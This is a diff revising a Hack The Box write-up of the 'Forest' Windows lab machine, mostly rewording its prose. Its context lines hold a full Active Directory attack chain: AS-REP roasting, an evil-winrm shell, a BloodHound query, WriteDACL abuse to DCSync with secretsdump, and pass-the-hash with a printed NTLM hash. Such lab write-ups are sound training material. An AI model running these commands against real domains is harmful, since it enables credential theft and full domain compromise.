@@ -14,8 +14,6 @@ tools_used: [nmap]
 
 **Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 14/06/2025
 
-## Summary
-
 ## Reconnaissance
 
 ```bash
@@ -39,7 +37,7 @@ nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
 
 ## Enumeration
 
-Firstly, I generated and appended a static hostname mapping entry to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
+I generated and appended a static hostname mapping to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
 ```bash
 nxc smb '10.10.10.161' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts
 
@@ -63,7 +61,7 @@ santi
 
 ## Exploitation
 
-Testing the user list for AS-REP roasting revealed accounts with "Do Not Require Kerberos Pre-Authentication" enabled...
+Testing the user list for AS-REP roasting revealed account an account `svc-alfresco` with "Do Not Require Kerberos Pre-Authentication" enabled, and thus allowing me to retrieve their password hash.
 ```bash
 nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     
 
@@ -88,14 +86,14 @@ WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016
 WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
 ```
 
-Used `evil-winrm` to get a remote shell.
+I used `evil-winrm` to get a remote shell on the machine.
 ```bash
 evil-winrm -i 'FOREST' -u 'htb.local\svc-alfresco' -p 's3rvice'
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
 ```
 
-User flag was in `svc-alfresco`'s Desktop.
+The user flag was in `svc-alfresco`'s Desktop.
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
 ```
@@ -114,23 +112,14 @@ SharpHound was already on the machine in the `svc-alfresco` user's home director
 2025-06-14T16:09:59.0652881-07:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 6/14/2025! Happy Graphing!
 ```
 
-And downloaded it to my machine.
+I then downloaded the data to my machine to be ingested into Bloodhound.
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco> download 20250614160957_loot.zip
                                         
 Info: Downloading C:\Users\svc-alfresco\20250614160957_loot.zip to 20250614160957_loot.zip                  
 ```
 
-So I started Bloodhound.
-```bash
-sudo ./bloodhound-cli containers start
-
-[+] Checking the status of Docker and the Compose plugin...
-[+] Starting the BloodHound environment
-[+] Running `docker` to restart containers with docker-compose.yml...
-```
-
-Imported the SharpHound data `20250614160957_loot.zip` and run a Custom Cypher Query to view the shortest path from owned principles (`svc-alfesco`) to domain Tier 0:
+I imported the SharpHound data `20250614160957_loot.zip` into Bloodhound and ran a Custom Cypher Query to view the shortest path from owned principals (`svc-alfresco`) to domain Tier 0:
 ```
 MATCH p = allShortestPaths((u:User)-[:AbuseTGTDelegation|AllowedToDelegate|HasSIDHistory|ADCSESC1|CanPSRemote|HasSession|ADCSESC10a|CanRDP|MemberOf|ADCSESC10b|CoerceAndRelayNTLMToADCS|Owns|ADCSESC13|CoerceAndRelayNTLMToLDAP|OwnsLimitedRights|ADCSESC3|CoerceAndRelayNTLMToLDAPS|ReadGMSAPassword|ADCSESC4|CoerceAndRelayNTLMToSMB|ReadLAPSPassword|ADCSESC6a|CoerceToTGT|SameForestTrust|ADCSESC6b|Contains|SpoofSIDHistory|ADCSESC9a|DCFor|SQLAdmin|ADCSESC9b|DCSync|SyncedToEntraUser|AddAllowedToAct|DumpSMSAPassword|SyncLAPSPassword|AddKeyCredentialLink|ExecuteDCOM|WriteAccountRestrictions|AddMember|ForceChangePassword|WriteDacl|AddSelf|GPLink|WriteGPLink|AdminTo|GenericAll|WriteOwner|AllExtendedRights|GenericWrite|WriteOwnerLimitedRights|AllowedToAct|GoldenCert|WriteSPN*1..]->(b:Base))
 WHERE "owned" IN split(u.system_tags, " ")
@@ -139,7 +128,7 @@ RETURN p
 LIMIT 1000
 ``` 
 
-Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". That group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync..
+Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". The "Exchange Windows Permissions" group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync.
 ![[Pasted image 20250615014133.png]]
 To perform the DCSync attack, I firstly created a new credential object and domain user account called "`wither`".
 ```powershell
@@ -164,7 +153,7 @@ Verbose: [Add-DomainObjectAcl] Granting principal CN=wither,CN=Users,DC=htb,DC=l
 >[!info] Important to note, `-Credential` using `wither`'s credential object was vital here for the attack to work, as I needed `Add-DomainObjectAcl` to run under the context of that account (as it was a member of "Exchange Windows Permissions" and thus had permission to modify ACLs) and not `svc-alfresco`.
 
 
-DCSync requested the `Administrator`'s password hash via domain replication through `secretsdump`.
+And therefore to request the `Administrator`'s password hash from the DC using `secretsdump`.
 ```bash
 wither@kali:~/CTF/HTB/Forest/files$ secretsdump.py 'HTB'/'wither':'password'@'FOREST' 
 
@@ -176,14 +165,14 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 [*] Cleaning up...
 ```
 
-Pass-the-hash with this NTLM hash provided access to the `Administrator` account.
+A Pass-the-hash attack with this NTLM hash provided access to the `Administrator` account.
 ```bash
 evil-winrm -i 'FOREST' -u 'htb.local\Administrator' -H 32693b11e6aa90eb43d32c72a07ceea6
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-And get the root flag in the `Administrator`'s Desktop.
+And allowed me to read the root flag in the `Administrator`'s Desktop.
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\Desktop\root.txt
 ```
